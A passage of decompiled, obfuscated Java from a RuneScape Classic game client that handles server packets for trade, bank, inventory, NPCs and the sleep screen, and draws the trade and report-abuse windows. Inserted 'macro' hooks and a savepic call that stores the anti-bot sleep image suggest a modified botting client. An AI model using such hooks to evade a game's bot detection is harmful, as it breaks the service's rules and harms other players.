                                    doortype[k27] = doortype[l31];
                                }
                                k27++;
                            } else
                            {
                                aClass10_739.method270(aClass5Array781[l31]);
                                efh.method427(doorx[l31], doory[l31], doordir[l31], doortype[l31]);
                            }

                        doorcount = k27;
                        if(k9 != 65535)
                        {
                            efh.method415(i16, k20, byte5, k9);
                            Class5 class5 = method106(i16, k20, byte5, k9, doorcount);
                            aClass5Array781[doorcount] = class5;
                            doorx[doorcount] = i16;
                            doory[doorcount] = k20;
                            doortype[doorcount] = k9;
                            doordir[doorcount++] = byte5;
                        }
                    }

                return;
            }
            if(i == 41)
            {
                anInt906 = npcCount;
                npcCount = 0;
                for(int i2 = 0; i2 < anInt906; i2++)
                    aClass2Array822[i2] = npc[i2];

                int l9 = 8;
                int j16 = fnf.method359(abyte0, l9, 8);
                l9 += 8;
                for(int l20 = 0; l20 < j16; l20++)
                {
                    Class2 class2_1 = aClass2Array822[l20];
                    int l27 = fnf.method359(abyte0, l9, 1);
                    l9++;
                    if(l27 != 0)
                    {
                        int i32 = fnf.method359(abyte0, l9, 1);
                        l9++;
                        if(i32 == 0)
                        {
                            int j35 = fnf.method359(abyte0, l9, 3);
                            l9 += 3;
                            int i38 = class2_1.anInt156;
                            int l40 = class2_1.anIntArray157[i38];
                            int j42 = class2_1.anIntArray158[i38];
                            if(j35 == 2 || j35 == 1 || j35 == 3)
                                l40 += absnpc;
                            if(j35 == 6 || j35 == 5 || j35 == 7)
                                l40 -= absnpc;
                            if(j35 == 4 || j35 == 3 || j35 == 5)
                                j42 += absnpc;
                            if(j35 == 0 || j35 == 1 || j35 == 7)
                                j42 -= absnpc;
                            class2_1.anInt154 = j35;
                            class2_1.anInt156 = i38 = (i38 + 1) % 10;
                            class2_1.anIntArray157[i38] = l40;
                            class2_1.anIntArray158[i38] = j42;
                        } else
                        {
                            int k35 = fnf.method359(abyte0, l9, 4);
                            if((k35 & 0xc) == 12)
                            {
                                l9 += 2;
                                continue;
                            }
                            class2_1.anInt154 = fnf.method359(abyte0, l9, 4);
                            l9 += 4;
                        }
                    }
                    npc[npcCount++] = class2_1;
                }

                while(l9 + 34 < j * 8) 
                {
                    int l24 = fnf.method359(abyte0, l9, 12);
                    l9 += 12;
                    int i28 = fnf.method359(abyte0, l9, 5);
                    l9 += 5;
                    if(i28 > 15)
                        i28 -= 32;
                    int j32 = fnf.method359(abyte0, l9, 5);
                    l9 += 5;
                    if(j32 > 15)
                        j32 -= 32;
                    int l35 = fnf.method359(abyte0, l9, 4);
                    l9 += 4;
                    int j38 = (smallx + i28) * absnpc + 64;
                    int i41 = (smally + j32) * absnpc + 64;
                    int k42 = fnf.method359(abyte0, l9, 10);
                    l9 += 10;
                    if(k42 >= identify.anInt122)
                        k42 = 24;
                    method107(l24, j38, i41, l35, k42);
                }
                return;
            }
            if(i == 47)
            {
                int j2 = fnf.method354(abyte0, 1);
                int i10 = 3;
                for(int k16 = 0; k16 < j2; k16++)
                {
                    int i21 = fnf.method354(abyte0, i10);
                    i10 += 2;
                    Class2 class2_2 = aClass2Array957[i21];
                    int j28 = fnf.method353(abyte0[i10]);
                    i10++;
                    if(j28 == 1)
                    {
                        int k32 = fnf.method354(abyte0, i10);
                        i10 += 2;
                        byte byte9 = abyte0[i10];
                        i10++;
                        if(class2_2 != null)
                        {
                            String s4 = cen.cfd(abyte0, i10, byte9);
                            class2_2.lastSaidTime = 150;
                            class2_2.lastSaidMessage = s4;
                            if(k32 == myplayer.id)
                                DisplayMessage("@yel@" + identify.npcName[class2_2.type] + ": " + class2_2.lastSaidMessage, 5);
                        }
                        i10 += byte9;
                    } else
                    if(j28 == 2)
                    {
                        int l32 = fnf.method353(abyte0[i10]);
                        i10++;
                        int i36 = fnf.method353(abyte0[i10]);
                        i10++;
                        int k38 = fnf.method353(abyte0[i10]);
                        i10++;
                        if(class2_2 != null)
                        {
                            class2_2.anInt164 = l32;
                            class2_2.anInt165 = i36;
                            class2_2.hbg = k38;
                            class2_2.anInt167 = 200;
                        }
                    }
                }

                return;
            }
            if(i == 117)
            {
                QuestMenu = true;
                int k2 = fnf.method353(abyte0[1]);
                answerCount = k2;
                int j10 = 2;
                for(int l16 = 0; l16 < k2; l16++)
                {
                    int j21 = fnf.method353(abyte0[j10]);
                    j10++;
                    aStringArray913[l16] = new String(abyte0, j10, j21);
                    j10 += j21;
                }

                return;
            }
            if(i == 208)
            {
                QuestMenu = false;
                return;
            }
            if(i == 249)
            {
                dih = true;
                anInt978 = fnf.method354(abyte0, 1);
                dha = fnf.method354(abyte0, 3);
                dhb = fnf.method354(abyte0, 5);
                egl = fnf.method354(abyte0, 7);
                anInt808 = fnf.method354(abyte0, 9);
                dhb -= egl * anInt808;
                return;
            }
            if(i == 16)
            {
                int l2 = 1;
                for(int k10 = 0; k10 < 18; k10++)
                    curstat[k10] = fnf.method353(abyte0[l2++]);

                for(int i17 = 0; i17 < 18; i17++)
                    stat[i17] = fnf.method353(abyte0[l2++]);

                for(int k21 = 0; k21 < 18; k21++)
                {
                    anIntArray712[k21] = fnf.method355(abyte0, l2);
                    l2 += 4;
                }

                anInt996 = fnf.method353(abyte0[l2++]);
                return;
            }
            if(i == 33)
            {
                for(int i3 = 0; i3 < 5; i3++)
                    anIntArray797[i3] = fnf.method353(abyte0[1 + i3]);

                return;
            }
            if(i == 109)
            {
                enb = 250;
                return;
            }
            if(i == 76)
            {
                int j3 = (j - 1) / 4;
                for(int l10 = 0; l10 < j3; l10++)
                {
                    int j17 = smallx + fnf.method357(abyte0, 1 + l10 * 4) >> 3;
                    int l21 = smally + fnf.method357(abyte0, 3 + l10 * 4) >> 3;
                    int i25 = 0;
                    for(int k28 = 0; k28 < itemCount; k28++)
                    {
                        int i33 = (itemx[k28] >> 3) - j17;
                        int j36 = (itemy[k28] >> 3) - l21;
                        if(i33 != 0 || j36 != 0)
                        {
                            if(k28 != i25)
                            {
                                itemx[i25] = itemx[k28];
                                itemy[i25] = itemy[k28];
                                itemtype[i25] = itemtype[k28];
                                anIntArray773[i25] = anIntArray773[k28];
                            }
                            i25++;
                        }
                    }

                    itemCount = i25;
                    i25 = 0;
                    for(int j33 = 0; j33 < mobCount; j33++)
                    {
                        int k36 = (mobx[j33] >> 3) - j17;
                        int l38 = (moby[j33] >> 3) - l21;
                        if(k36 != 0 || l38 != 0)
                        {
                            if(j33 != i25)
                            {
                                aClass5Array814[i25] = aClass5Array814[j33];
                                aClass5Array814[i25].anInt257 = i25;
                                mobx[i25] = mobx[j33];
                                moby[i25] = moby[j33];
                                mobtype[i25] = mobtype[j33];
                                mobid[i25] = mobid[j33];
                            }
                            i25++;
                        } else
                        {
                            aClass10_739.method270(aClass5Array814[j33]);
                            efh.method434(mobx[j33], moby[j33], mobtype[j33]);
                        }
                    }

                    mobCount = i25;
                    i25 = 0;
                    for(int l36 = 0; l36 < doorcount; l36++)
                    {
                        int i39 = (doorx[l36] >> 3) - j17;
                        int j41 = (doory[l36] >> 3) - l21;
                        if(i39 != 0 || j41 != 0)
                        {
                            if(l36 != i25)
                            {
                                aClass5Array781[i25] = aClass5Array781[l36];
                                aClass5Array781[i25].anInt257 = i25 + 10000;
                                doorx[i25] = doorx[l36];
                                doory[i25] = doory[l36];
                                doordir[i25] = doordir[l36];
                                doortype[i25] = doortype[l36];
                            }
                            i25++;
                        } else
                        {
                            aClass10_739.method270(aClass5Array781[l36]);
                            efh.method427(doorx[l36], doory[l36], doordir[l36], doortype[l36]);
                        }
                    }

                    doorcount = i25;
                }

                return;
            }
            if(i == 7)
            {
                aBoolean992 = true;
                return;
            }
            if(i == 108)
            {
                int k3 = fnf.method354(abyte0, 1);
                if(aClass2Array891[k3] != null)
                    aString682 = aClass2Array891[k3].name;
                tradeFirst = true;
                aBoolean944 = false;
                aBoolean945 = false;
                tradeTotal = 0;
                anInt886 = 0;
                return;
            }
            if(i == 113)
            {
                tradeFirst = false;
                tradeSecond = false;
				macro.TradeOver();
                return;
            }
            if(i == 155)
            {
                anInt886 = abyte0[1] & 0xff;
                int l3 = 2;
                for(int i11 = 0; i11 < anInt886; i11++)
                {
                    anIntArray887[i11] = fnf.method354(abyte0, l3);
                    l3 += 2;
                    anIntArray888[i11] = fnf.method355(abyte0, l3);
                    l3 += 4;
                }

                aBoolean944 = false;
                aBoolean945 = false;
                return;
            }
            if(i == 185)
            {
                byte byte0 = abyte0[1];
                if(byte0 == 1)
                {
					macro.Accepted();
                    aBoolean944 = true;
                    return;
                } else
                {
                    aBoolean944 = false;
                    return;
                }
            }
            if(i == 24)
            {
                shop = true;
                int i4 = 1;
                int j11 = abyte0[i4++] & 0xff;
                byte byte4 = abyte0[i4++];
                deh = abyte0[i4++] & 0xff;
                dei = abyte0[i4++] & 0xff;
                for(int i22 = 0; i22 < 40; i22++)
                    ebd[i22] = -1;

                for(int j25 = 0; j25 < j11; j25++)
                {
                    ebd[j25] = fnf.method354(abyte0, i4);
                    i4 += 2;
                    ebe[j25] = fnf.method354(abyte0, i4);
                    i4 += 2;
                    ebf[j25] = abyte0[i4++];
                }

                if(byte4 == 1)
                {
                    int l28 = 39;
                    for(int k33 = 0; k33 < InvCount; k33++)
                    {
                        if(l28 < j11)
                            break;
                        boolean flag2 = false;
                        for(int j39 = 0; j39 < 40; j39++)
                        {
                            if(ebd[j39] != inv[k33])
                                continue;
                            flag2 = true;
                            break;
                        }

                        if(inv[k33] == 10)
                            flag2 = true;
                        if(!flag2)
                        {
                            ebd[l28] = inv[k33] & 0x7fff;
                            ebe[l28] = 0;
                            ebf[l28] = 0;
                            l28--;
                        }
                    }

                }
                if(ddh >= 0 && ddh < 40 && ebd[ddh] != anInt904)
                {
                    ddh = -1;
                    anInt904 = -2;
                }
                return;
            }
            if(i == 42)
            {
                shop = false;
                return;
            }
            if(i == 170)
            {
                byte byte1 = abyte0[1];
                if(byte1 == 1)
                {
                    aBoolean945 = true;
                    return;
                } else
                {
                    aBoolean945 = false;
                    return;
                }
            }
            if(i == 161)
            {
                aBoolean675 = fnf.method353(abyte0[1]) == 1;
                aBoolean767 = fnf.method353(abyte0[2]) == 1;
                aBoolean853 = fnf.method353(abyte0[3]) == 1;
                return;
            }
            if(i == 222)
            {
                for(int j4 = 0; j4 < j - 1; j4++)
                {
                    boolean flag = abyte0[j4 + 1] == 1;
                    if(!dia[j4] && flag)
                        faj("prayeron");
                    if(dia[j4] && !flag)
                        faj("prayeroff");
                    dia[j4] = flag;
                }

                return;
            }
            if(i == 26)
            {
                for(int k4 = 0; k4 < 50; k4++)
                    aBooleanArray716[k4] = abyte0[k4 + 1] == 1;

                return;
            }
            if(i == 188)
            {
                bank = true;
                int l4 = 1;
                anInt936 = abyte0[l4++] & 0xff;
                anInt916 = abyte0[l4++] & 0xff;
                for(int k11 = 0; k11 < anInt936; k11++)
                {
                    anIntArray816[k11] = fnf.method354(abyte0, l4);
                    l4 += 2;
                    anIntArray817[k11] = fnf.method358(abyte0, l4);
                    if(anIntArray817[k11] >= 128)
                        l4 += 4;
                    else
                        l4++;
                }

                method72();
                return;
            }
            if(i == 130)
            {
                bank = false;
                return;
            }
            if(i == 69)
            {
                int i5 = abyte0[1] & 0xff;
                anIntArray712[i5] = fnf.method355(abyte0, 2);
                return;
            }
            if(i == 240)
            {
                int j5 = fnf.method354(abyte0, 1);
                if(aClass2Array891[j5] != null)
                    aString824 = aClass2Array891[j5].name;
                aBoolean917 = true;
                anInt910 = 0;
                anInt959 = 0;
                aBoolean668 = false;
                aBoolean669 = false;
                aBoolean718 = false;
                aBoolean719 = false;
                aBoolean720 = false;
                aBoolean721 = false;
                return;
            }
            if(i == 198)
            {
                aBoolean917 = false;
                aBoolean801 = false;
                return;
            }
            if(i == 128)
            {
                tradeSecond = true;
                aBoolean674 = false;
                tradeFirst = false;
                int k5 = 1;
                aLong847 = fnf.method356(abyte0, k5);
                k5 += 8;
                anInt691 = abyte0[k5++] & 0xff;
                for(int l11 = 0; l11 < anInt691; l11++)
                {
                    anIntArray692[l11] = fnf.method354(abyte0, k5);
                    k5 += 2;
                    anIntArray693[l11] = fnf.method355(abyte0, k5);
                    k5 += 4;
                }

                anInt836 = abyte0[k5++] & 0xff;
                for(int k17 = 0; k17 < anInt836; k17++)
                {
                    anIntArray837[k17] = fnf.method354(abyte0, k5);
                    k5 += 2;
                    anIntArray838[k17] = fnf.method355(abyte0, k5);
                    k5 += 4;
                }

                return;
            }
            if(i == 229)
            {
                anInt959 = abyte0[1] & 0xff;
                int l5 = 2;
                for(int i12 = 0; i12 < anInt959; i12++)
                {
                    anIntArray960[i12] = fnf.method354(abyte0, l5);
                    l5 += 2;
                    anIntArray961[i12] = fnf.method355(abyte0, l5);
                    l5 += 4;
                }

                aBoolean668 = false;
                aBoolean669 = false;
                return;
            }
            if(i == 211)
            {
                if(abyte0[1] == 1)
                    aBoolean718 = true;
                else
                    aBoolean718 = false;
                if(abyte0[2] == 1)
                    aBoolean719 = true;
                else
                    aBoolean719 = false;
                if(abyte0[3] == 1)
                    aBoolean720 = true;
                else
                    aBoolean720 = false;
                if(abyte0[4] == 1)
                    aBoolean721 = true;
                else
                    aBoolean721 = false;
                aBoolean668 = false;
                aBoolean669 = false;
                return;
            }
            if(i == 81)
            {
                int i6 = 1;
                int j12 = abyte0[i6++] & 0xff;
                int l17 = fnf.method354(abyte0, i6);
                i6 += 2;
                int j22 = fnf.method358(abyte0, i6);
                if(j22 >= 128)
                    i6 += 4;
                else
                    i6++;
                if(j22 == 0)
                {
                    anInt936--;
                    for(int k25 = j12; k25 < anInt936; k25++)
                    {
                        anIntArray816[k25] = anIntArray816[k25 + 1];
                        anIntArray817[k25] = anIntArray817[k25 + 1];
                    }

                } else
                {
                    anIntArray816[j12] = l17;
                    anIntArray817[j12] = j22;
                    if(j12 >= anInt936)
                        anInt936 = j12 + 1;
                }
                method72();
                return;
            }
            if(i == 210)
            {
                int j6 = 1;
                int k12 = 1;
                int i18 = abyte0[j6++] & 0xff;
                int k22 = fnf.method354(abyte0, j6);
                j6 += 2;
                if(identify.ahl[k22 & 0x7fff] == 0)
                {
                    k12 = fnf.method358(abyte0, j6);
                    if(k12 >= 128)
                        j6 += 4;
                    else
                        j6++;
                }
                inv[i18] = k22 & 0x7fff;
                isWorn[i18] = k22 / 32768;
                dkb[i18] = k12;
                if(i18 >= InvCount)
                    InvCount = i18 + 1;
                return;
            }
            if(i == 44)
            {
                int k6 = abyte0[1] & 0xff;
                InvCount--;
                for(int l12 = k6; l12 < InvCount; l12++)
                {
                    inv[l12] = inv[l12 + 1];
                    dkb[l12] = dkb[l12 + 1];
                    isWorn[l12] = isWorn[l12 + 1];
                }

                return;
            }
            if(i == 23)
            {
                int l6 = 1;
                int i13 = abyte0[l6++] & 0xff;
                curstat[i13] = fnf.method353(abyte0[l6++]);
                stat[i13] = fnf.method353(abyte0[l6++]);
                anIntArray712[i13] = fnf.method355(abyte0, l6);
                l6 += 4;
                return;
            }
            if(i == 73)
            {
                byte byte2 = abyte0[1];
                if(byte2 == 1)
                {
                    aBoolean668 = true;
                    return;
                } else
                {
                    aBoolean668 = false;
                    return;
                }
            }
            if(i == 131)
            {
                byte byte3 = abyte0[1];
                if(byte3 == 1)
                {
                    aBoolean669 = true;
                    return;
                } else
                {
                    aBoolean669 = false;
                    return;
                }
            }
            if(i == 10)
            {
                aBoolean801 = true;
                aBoolean802 = false;
                aBoolean917 = false;
                int i7 = 1;
                aLong907 = fnf.method356(abyte0, i7);
                i7 += 8;
                anInt786 = abyte0[i7++] & 0xff;
                for(int j13 = 0; j13 < anInt786; j13++)
                {
                    anIntArray787[j13] = fnf.method354(abyte0, i7);
                    i7 += 2;
                    anIntArray788[j13] = fnf.method355(abyte0, i7);
                    i7 += 4;
                }

                anInt663 = abyte0[i7++] & 0xff + 2;
                for(int j18 = 0; j18 < anInt663; j18++)
                {
                    anIntArray664[j18] = fnf.method354(abyte0, i7);
                    i7 += 2;
                    anIntArray665[j18] = fnf.method355(abyte0, i7);
                    i7 += 4;
                }

                anInt988 = abyte0[i7++] & 0xff;
                anInt989 = abyte0[i7++] & 0xff;
                anInt990 = abyte0[i7++] & 0xff;
                anInt991 = abyte0[i7++] & 0xff;
                return;
            }
            if(i == 238)
            {
                String s = new String(abyte0, 1, j - 1);
                faj(s);
                return;
            }
            if(i == 253)
            {
                if(anInt833 < 50)
                {
                    int j7 = abyte0[1] & 0xff;
                    int k13 = abyte0[2] + smallx;
                    int k18 = abyte0[3] + smally;
                    anIntArray730[anInt833] = j7;
                    anIntArray972[anInt833] = 0;
                    anIntArray881[anInt833] = k13;
                    anIntArray934[anInt833] = k18;
                    anInt833++;
                }
                return;
            }
            if(i == 126)
            {
                if(!aBoolean849)
                {
                    anInt782 = fnf.method355(abyte0, 1);
                    anInt898 = fnf.method354(abyte0, 5);
                    anInt685 = abyte0[7] & 0xff;
                    anInt924 = fnf.method354(abyte0, 8);
                    aBoolean908 = true;
                    aBoolean849 = true;
                    aString894 = null;
                }
                return;
            }
            if(i == 112)
            {
                aString681 = new String(abyte0, 1, j - 1);
                aBoolean745 = true;
                aBoolean680 = false;
                return;
            }
            if(i == 49)
            {
                aString681 = new String(abyte0, 1, j - 1);
                aBoolean745 = true;
                aBoolean680 = true;
                return;
            }
            if(i == 60)
            {
                fatigue = fnf.method354(abyte0, 1);
                return;
            }
            if(i == 15)
            {
                if(!sleeping)
                    tfatigue = fatigue;
                sleeping = true;
                super.fln = "";
                super.fma = "";
                gfx.method226(anInt952 + 1, abyte0);
				savepic(abyte0);
                ejk = null;
                return;
            }
            if(i == 174)
            {
                tfatigue = fnf.method354(abyte0, 1);
                return;
            }
            if(i == 206)
            {
                sleeping = false;
                return;
            }
            if(i == 20)
            {
                ejk = "Incorrect - Please wait...";
                return;
            }
            if(i == 28)
            {
                anInt749 = fnf.method354(abyte0, 1) * 32;
                return;
            }
        }
        catch(RuntimeException runtimeexception)
        {
			runtimeexception.toString();
            if(anInt933 < 3)
            {
                super.packets.id(7);
                super.packets.hfk(runtimeexception.toString());
                super.packets.send();
                super.packets.id(7);
                super.packets.hfk("p-type:" + i + " p-size:" + j);
                super.packets.send();
                super.packets.id(7);
                super.packets.hfk("rx:" + smallx + " ry:" + smally + " num3l:" + mobCount);
                super.packets.send();
                String s1 = "";
                for(int l18 = 0; l18 < 80 && l18 < j; l18++)
                    s1 = s1 + abyte0[l18] + " ";

                super.packets.id(7);
                super.packets.hfk(s1);
                super.packets.send();
                anInt933++;
            }
        }
    }
    protected final void method42(String s)
    {
        if(s.startsWith("@bor@"))
        {
            DisplayMessage(s, 4);
            return;
        }
        if(s.startsWith("@que@"))
        {
            DisplayMessage("@whi@" + s, 5);
            return;
        }
        if(s.startsWith("@pri@"))
        {
            DisplayMessage(s, 6);
            return;
        } else
        {
            DisplayMessage(s, 3);
            return;
        }
    }

    protected final int method44()
    {
        return Class8.anInt371;
    }

    public static final void method45(String as[])
    {
        mudclient mudclient1 = new mudclient();
        mudclient1.aBoolean979 = false;
        if(as.length > 0 && as[0].equals("members"))
            mudclient1.member = true;
        if(as.length > 1)
            mudclient1.gameIP = as[1];
        if(as.length > 2)
            mudclient1.gamePort = Integer.parseInt(as[2]);
        mudclient1.method6(mudclient1.anInt676, mudclient1.anInt677 + 11, "Runescape by Andrew Gower", false);
        mudclient1.anInt32 = 10;
    }

    public final void method46()
    {
        int l = identify.anInt144;
        if(anInt813 != 0)
        {
            for(int i = 0; i < answerCount; i++)
            {
                if(super.anInt33 >= gfx.method263(aStringArray913[i], 1) || super.anInt34 <= i * 12 || super.anInt34 >= 12 + i * 12)
                    continue;
				System.out.println("Answer(" + i + ");");
                super.packets.id(189);
                super.packets.var(i);
                super.packets.send();
                break;
            }

            anInt813 = 0;
            QuestMenu = false;
            return;
        }
        for(int j = 0; j < answerCount; j++)
        {
            int k = 65535;
            if(super.anInt33 < gfx.method263(aStringArray913[j], 1) && super.anInt34 > j * 12 && super.anInt34 < 12 + j * 12)
                k = 0xff0000;
            gfx.method257(aStringArray913[j], 6, 12 + j * 12, 1, k);
        }

    }

    public final void method47()
    {
        if(super.fma.length() > 0)
        {
            String s = super.fma.trim();
            super.fln = "";
            super.fma = "";
            if(s.length() > 0)
            {
                long l = fnf.method362(s);
                super.packets.id(215);
                super.packets.method342(l);
                super.packets.var(anInt863);
                super.packets.var(aBoolean810 ? 1 : 0);
                super.packets.send();
            }
            anInt986 = 0;
            return;
        }
        gfx.method216(56, 130, 400, 100, 0);
        gfx.method217(56, 130, 400, 100, 0xffffff);
        int i = 160;
        gfx.drawString("Now type the name of the offending player, and press enter", 256, i, 1, 0xffff00);
        i += 18;
        gfx.drawString("Name: " + super.fln + "*", 256, i, 4, 0xffffff);
        if(super.anInt637 > 0)
        {
            i = 207;
            if(aBoolean810)
                gfx.drawString("Moderator option: Mute player for 48 hours: <ON>", 256, i, 1, 0xff8000);
            else
                gfx.drawString("Moderator option: Mute player for 48 hours: <OFF>", 256, i, 1, 0xffffff);
            if(super.anInt33 > 106 && super.anInt33 < 406 && super.anInt34 > i - 13 && super.anInt34 < i + 2 && anInt813 == 1)
            {
                anInt813 = 0;
                aBoolean810 = !aBoolean810;
            }
        }
        i = 222;
        int j = 0xffffff;
        if(super.anInt33 > 196 && super.anInt33 < 316 && super.anInt34 > i - 13 && super.anInt34 < i + 2)
        {
            j = 0xffff00;
            if(anInt813 == 1)
            {
                anInt813 = 0;
                anInt986 = 0;
            }
        }
        gfx.drawString("Click here to cancel", 256, i, 1, j);
        if(anInt813 == 1 && (super.anInt33 < 56 || super.anInt33 > 456 || super.anInt34 < 130 || super.anInt34 > 230))
        {
            anInt813 = 0;
            anInt986 = 0;
        }
    }

    public static final String method48(int i)
    {
        int k = identify.anInt144;
        String s = String.valueOf(i);
        for(int j = s.length() - 3; j > 0; j -= 3)
            s = s.substring(0, j) + "," + s.substring(j);

        if(s.length() > 8)
            s = "@gre@" + s.substring(0, s.length() - 8) + " million @whi@(" + s + ")";
        else
        if(s.length() > 4)
            s = "@cya@" + s.substring(0, s.length() - 4) + "K @whi@(" + s + ")";
        return s;
    }

    public final void method49()
    {
        char c = '\u0190';
        char c1 = 'd';
        if(aBoolean680)
        {
            c1 = '\u01C2';
            c1 = '\u012C';
        }
        gfx.method216(256 - c / 2, 167 - c1 / 2, c, c1, 0);
        gfx.method217(256 - c / 2, 167 - c1 / 2, c, c1, 0xffffff);
        gfx.method256(aString681, 256, (167 - c1 / 2) + 20, 1, 0xffffff, c - 40);
        int i = 157 + c1 / 2;
        int j = 0xffffff;
        if(super.anInt34 > i - 12 && super.anInt34 <= i && super.anInt33 > 106 && super.anInt33 < 406)
            j = 0xff0000;
        gfx.drawString("Click here to close window", 256, i, 1, j);
        if(anInt813 == 1)
        {
            if(j == 0xff0000)
                aBoolean745 = false;
            if((super.anInt33 < 256 - c / 2 || super.anInt33 > 256 + c / 2) && (super.anInt34 < 167 - c1 / 2 || super.anInt34 > 167 + c1 / 2))
                aBoolean745 = false;
        }
        anInt813 = 0;
    }

    public final void method50()
    {
        ehc = 0;
        anInt690 = 0;
        djk = "";
        djl = "";
        aString861 = "Please enter a username:";
        aString862 = "*" + djk + "*";
        playerCount = 0;
        npcCount = 0;
    }

    public final void method51()
    {
        int i7 = identify.anInt144;
        if(anInt813 != 0 && anInt819 == 0)
            anInt819 = 1;
        if(anInt819 > 0)
        {
            int i = super.anInt33 - 22;
            int j = super.anInt34 - 36;
            if(i >= 0 && j >= 0 && i < 468 && j < 262)
            {
                if(i > 216 && j > 30 && i < 462 && j < 235)
                {
                    int k = (i - 217) / 49 + ((j - 31) / 34) * 5;
                    if(k >= 0 && k < InvCount)
                    {
                        boolean flag = false;
                        int l1 = 0;
                        int k2 = inv[k];
                        for(int k3 = 0; k3 < tradeTotal; k3++)
                            if(tradeType[k3] == k2)
                                if(identify.ahl[k2] == 0)
                                {
                                    for(int i4 = 0; i4 < anInt819; i4++)
                                    {
                                        if(tradeCount[k3] < dkb[k])
                                            tradeCount[k3]++;
                                        flag = true;
                                    }

                                } else
                                {
                                    l1++;
                                }

                        if(InvCount(k2) <= l1)
                            flag = true;
                        if(identify.anIntArray59[k2] == 1)
                        {
                            DisplayMessage("This object cannot be traded with other players", 3);
                            flag = true;
                        }
                        if(!flag && tradeTotal < 14)
                        {
                            tradeType[tradeTotal] = k2;
                            tradeCount[tradeTotal] = 1;
                            tradeTotal++;
                            flag = true;
                        }
                        if(flag)
                        {
                            super.packets.id(144);
                            super.packets.var(tradeTotal);
                            for(int j4 = 0; j4 < tradeTotal; j4++)
                            {
                                super.packets.cmd(tradeType[j4]);
                                super.packets.hfb(tradeCount[j4]);
                            }

                            super.packets.send();
                            aBoolean944 = false;
                            aBoolean945 = false;
                        }
                    }
                }
                if(i > 8 && j > 30 && i < 205 && j < 133)
                {
                    int l = (i - 9) / 49 + ((j - 31) / 34) * 4;
                    if(l >= 0 && l < tradeTotal)
                    {
                        int j1 = tradeType[l];
                        for(int i2 = 0; i2 < anInt819; i2++)
                        {
                            if(identify.ahl[j1] == 0 && tradeCount[l] > 1)
                            {
                                tradeCount[l]--;
                                continue;
                            }
                            tradeTotal--;
                            anInt818 = 0;
                            for(int l2 = l; l2 < tradeTotal; l2++)
                            {
                                tradeType[l2] = tradeType[l2 + 1];
                                tradeCount[l2] = tradeCount[l2 + 1];
                            }

                            break;
                        }

                        super.packets.id(144);
                        super.packets.var(tradeTotal);
                        for(int i3 = 0; i3 < tradeTotal; i3++)
                        {
                            super.packets.cmd(tradeType[i3]);
                            super.packets.hfb(tradeCount[i3]);
                        }

                        super.packets.send();
                        aBoolean944 = false;
                        aBoolean945 = false;
                    }
                }
                if(i >= 217 && j >= 238 && i <= 286 && j <= 259)
                {
                    aBoolean945 = true;
                    super.packets.id(94);
                    super.packets.send();
                }
                if(i >= 394 && j >= 238 && i < 463 && j < 259)
                {
                    tradeFirst = false;
                    super.packets.id(27);
                    super.packets.send();
                }
            } else
            if(anInt813 != 0)
            {
                tradeFirst = false;
                super.packets.id(27);
                super.packets.send();
            }
            anInt813 = 0;
            anInt819 = 0;
        }
        if(!tradeFirst)
            return;
        byte byte0 = 22;
        byte byte1 = 36;
        gfx.method216(byte0, byte1, 468, 12, 192);
        int i1 = 0x989898;
        gfx.method214(byte0, byte1 + 12, 468, 18, i1, 160);
        gfx.method214(byte0, byte1 + 30, 8, 248, i1, 160);
        gfx.method214(byte0 + 205, byte1 + 30, 11, 248, i1, 160);
        gfx.method214(byte0 + 462, byte1 + 30, 6, 248, i1, 160);
        gfx.method214(byte0 + 8, byte1 + 133, 197, 22, i1, 160);
        gfx.method214(byte0 + 8, byte1 + 258, 197, 20, i1, 160);
        gfx.method214(byte0 + 216, byte1 + 235, 246, 43, i1, 160);
        int k1 = 0xd0d0d0;
        gfx.method214(byte0 + 8, byte1 + 30, 197, 103, k1, 160);
        gfx.method214(byte0 + 8, byte1 + 155, 197, 103, k1, 160);
        gfx.method214(byte0 + 216, byte1 + 30, 246, 205, k1, 160);
        for(int j2 = 0; j2 < 4; j2++)
            gfx.method218(byte0 + 8, byte1 + 30 + j2 * 34, 197, 0);

        for(int j3 = 0; j3 < 4; j3++)
            gfx.method218(byte0 + 8, byte1 + 155 + j3 * 34, 197, 0);

        for(int l3 = 0; l3 < 7; l3++)
            gfx.method218(byte0 + 216, byte1 + 30 + l3 * 34, 246, 0);

        for(int k4 = 0; k4 < 6; k4++)
        {
            if(k4 < 5)
                gfx.method219(byte0 + 8 + k4 * 49, byte1 + 30, 103, 0);
            if(k4 < 5)
                gfx.method219(byte0 + 8 + k4 * 49, byte1 + 155, 103, 0);
            gfx.method219(byte0 + 216 + k4 * 49, byte1 + 30, 205, 0);
        }

        gfx.method257("Trading with: " + aString682, byte0 + 1, byte1 + 10, 1, 0xffffff);
        gfx.method257("Your Offer", byte0 + 9, byte1 + 27, 4, 0xffffff);
        gfx.method257("Opponent's Offer", byte0 + 9, byte1 + 152, 4, 0xffffff);
        gfx.method257("Your Inventory", byte0 + 216, byte1 + 27, 4, 0xffffff);
        if(!aBoolean945)
            gfx.method231(byte0 + 217, byte1 + 238, anInt948 + 25);
        gfx.method231(byte0 + 394, byte1 + 238, anInt948 + 26);
        if(aBoolean944)
        {
            gfx.drawString("Other player", byte0 + 341, byte1 + 246, 1, 0xffffff);
            gfx.drawString("has accepted", byte0 + 341, byte1 + 256, 1, 0xffffff);
        }
        if(aBoolean945)
        {
            gfx.drawString("Waiting for", byte0 + 217 + 35, byte1 + 246, 1, 0xffffff);
            gfx.drawString("other player", byte0 + 217 + 35, byte1 + 256, 1, 0xffffff);
        }
        for(int l4 = 0; l4 < InvCount; l4++)
        {
            int i5 = 217 + byte0 + (l4 % 5) * 49;
            int k5 = 31 + byte1 + (l4 / 5) * 34;
            gfx.method247(i5, k5, 48, 32, anInt950 + identify.anIntArray53[inv[l4]], identify.anIntArray58[inv[l4]], 0, 0, false);
            if(identify.ahl[inv[l4]] == 0)
                gfx.method257(String.valueOf(dkb[l4]), i5 + 1, k5 + 10, 1, 0xffff00);
        }

        for(int j5 = 0; j5 < tradeTotal; j5++)
        {
            int l5 = 9 + byte0 + (j5 % 4) * 49;
            int j6 = 31 + byte1 + (j5 / 4) * 34;
            gfx.method247(l5, j6, 48, 32, anInt950 + identify.anIntArray53[tradeType[j5]], identify.anIntArray58[tradeType[j5]], 0, 0, false);
            if(identify.ahl[tradeType[j5]] == 0)
                gfx.method257(String.valueOf(tradeCount[j5]), l5 + 1, j6 + 10, 1, 0xffff00);
            if(super.anInt33 > l5 && super.anInt33 < l5 + 48 && super.anInt34 > j6 && super.anInt34 < j6 + 32)
